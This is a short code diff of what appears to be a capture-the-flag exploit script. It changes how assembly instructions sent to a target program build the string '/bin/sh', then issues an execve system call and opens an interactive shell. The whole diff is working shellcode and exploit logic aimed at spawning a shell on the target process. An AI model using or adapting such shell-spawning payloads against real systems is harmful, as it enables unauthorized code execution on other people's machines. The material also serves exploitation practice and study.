@@ -69,44 +69,15 @@ jmp rax
 ''')
 input('Waiting...')
 
-# /bin/sh: Fill bottom 32-bit.
-send(f'''
-or r15, 0x6e
-mov rax, 0x00401196
-jmp rax
-''')
-input('Waiting...')
+write('0x6e', wait=True)
+write('0x69', wait=True)
+write('0x62', wait=True)
+write('0x2f', wait=True)
 
-# /bin/sh: Shift them left.
 send(f'''
-shl r15, 8
-mov rax, 0x00401196
-jmp rax
+xor rax, rax
+mov al, 0x3b
+syscall
 ''')
-input('Waiting...')
-
-# /bin/sh: Fill bottom 32-bit.
-send(f'''
-or r15, 0x69
-mov rax, 0x00401196
-jmp rax
-''')
-input('Waiting...')
-
-# /bin/sh: Shift them left.
-send(f'''
-shl r15, 8
-mov rax, 0x00401196
-jmp rax
-''')
-input('Waiting...')
-
-# /bin/sh: Fill bottom 32-bit.
-send(f'''
-or r15, 0x622f
-mov rax, 0x00401196
-jmp rax
-''')
-input('Waiting...')
 
 p.interactive()
